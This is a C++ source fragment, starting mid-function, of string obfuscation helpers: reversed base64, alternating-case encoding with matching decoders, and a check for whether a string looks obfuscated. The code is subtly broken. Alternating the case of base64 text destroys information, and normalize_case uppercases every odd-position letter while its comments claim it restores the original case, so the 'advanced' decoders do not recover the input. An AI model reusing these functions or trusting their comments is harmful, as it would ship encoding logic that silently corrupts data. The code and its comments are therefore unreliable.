    std::string normal_b64 = base64_encode_string(str);
    return reverse_string(normal_b64);
}

std::vector<uint8_t> reverse_base64_decode_to_bytes(const std::string& encoded) {
    std::string normal_b64 = reverse_string(encoded);
    return base64_decode_to_bytes(normal_b64);
}

std::string reverse_base64_decode_to_string(const std::string& encoded) {
    std::vector<uint8_t> bytes = reverse_base64_decode_to_bytes(encoded);
    return std::string(bytes.begin(), bytes.end());
}

std::string reverse_string(const std::string& str) {
    return std::string(str.rbegin(), str.rend());
}

// Advanced obfuscation standalone functions
std::string advanced_obfuscate_encode_data(const std::vector<uint8_t>& data) {
    std::string base64_str = base64_encode_data(data);
    std::string reversed = reverse_string(base64_str);
    return alternate_case(reversed);
}

std::string advanced_obfuscate_encode_string(const std::string& str) {
    std::vector<uint8_t> bytes(str.begin(), str.end());
    return advanced_obfuscate_encode_data(bytes);
}

std::vector<uint8_t> advanced_obfuscate_decode_to_bytes(const std::string& encoded) {
    std::string normalized = normalize_case(encoded);
    std::string unreversed = reverse_string(normalized);
    return base64_decode_to_bytes(unreversed);
}

std::string advanced_obfuscate_decode_to_string(const std::string& encoded) {
    std::vector<uint8_t> bytes = advanced_obfuscate_decode_to_bytes(encoded);
    return std::string(bytes.begin(), bytes.end());
}

std::string alternate_case(const std::string& str) {
    std::string result;
    result.reserve(str.length());
    
    for (size_t i = 0; i < str.length(); ++i) {
        char c = str[i];
        if (i % 2 == 0) {
            result += std::toupper(c);
        } else {
            result += std::tolower(c);
        }
    }
    
    return result;
}

std::string normalize_case(const std::string& str) {
    std::string result;
    result.reserve(str.length());
    
    for (size_t i = 0; i < str.length(); ++i) {
        char c = str[i];
        if (std::isalpha(c)) {
            if (i % 2 == 0) {
                // Even positions were uppercased, restore if needed
                result += c;
            } else {
                // Odd positions were lowercased, restore to uppercase if it was
                if (std::islower(c)) {
                    result += std::toupper(c);
                } else {
                    result += c;
                }
            }
        } else {
            result += c;
        }
    }
    
    return result;
}

bool is_advanced_obfuscated(const std::string& str) {
    if (str.empty()) {
        return false;
    }
    
    bool hasUpperLower = false;
    bool hasLowerUpper = false;
    
    for (size_t i = 0; i < str.length() - 1; ++i) {
        char current = str[i];
        char next = str[i + 1];
        
        if (std::islower(current) && std::isupper(next)) {
            hasLowerUpper = true;
        }
        if (std::isupper(current) && std::islower(next)) {
            hasUpperLower = true;
        }
    }
    
    bool hasBase64Chars = str.find_first_not_of("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=") == std::string::npos;
    
    return hasBase64Chars && (hasUpperLower || hasLowerUpper);
}